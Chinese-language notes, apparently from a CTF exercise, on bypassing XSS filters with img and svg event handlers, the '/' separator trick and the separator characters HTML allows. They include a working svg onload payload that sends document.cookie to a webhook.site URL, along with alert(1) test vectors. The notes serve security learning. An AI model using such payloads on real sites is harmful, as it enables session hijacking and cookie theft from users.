#过滤script
script标签被过滤后我们尝试其他标签，比如img
`<img>` 可以设置 `onerror` 事件，当图片加载失败的时候会执行 `onerror` 。
但是在这道题中发现 `onerror` 无法正常执行
所以我们切换到 `<svg>` 标签，构造payload：
`<svg onload="location.href='https://webhook.site/83cb0cb3-6de4-491c-8f6b-ca300d28cb2c?c='+document.cookie"/>`

---

#svg 
`<svg>` 是用来显示 `可缩放矢量图形` 的，比如
```
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200">
  <!-- 这里放各种子元素 -->
  <circle cx="100" cy="100" r="80" fill="red" stroke="black" stroke-width="4"/>
</svg>
```
对于 `<svg>` 的主要功能我们先不关注，重点去关注有什么安全威胁
`<svg/onload=alert(1)>` 经典代码 `onload`
- `/` 起到分隔作用，等同于空格
	- 大部分标签可以用 `/` 进行分隔，比如 `<div/id=1>`
		- 不过要注意 `/` 有时候会被识别为闭合标识
			- `<br/>` 合法的HTML5/XHTML自闭合写法
			- `<img/>` 合法
		- `<script>` 标签无法使用 `/` 作为分隔符
			- `<script/src="x.js">` 浏览器无法正常解析，因为 `script` 解析更为严格
			- 不过 `<script/src="x.js">` 仍然可以被解析成 `<script>` 
	- 本质原因：`读取标签名 → 遇到 / → 不是合法属性名开头→ 忽略 / → 继续解析后续属性`
	- `/` 其实并不是合法的分隔符，空格和制表符才是。浏览器是为了容错才允许 `/`的
	- 但是其实能被容错的字符很少
- onload` 是 `svg` 加载完成后调用的事件处理器

### 合法分隔符（HTML 规范定义）

| 字符  | Unicode | 说明   |
| --- | ------- | ---- |
| 空格  | U+0020  | 最标准  |
| 制表符 | U+0009  | `\t` |
| 换行  | U+000A  | `\n` |
| 换页  | U+000C  | `\f` |
| 回车  | U+000D  | `\r` |
#html标签不合法时
当html标签不合法时，标签内部文本会被作为纯文本输出
`<unknowntag>这里是文本</unknowntag> ✅ 内容作为文本`
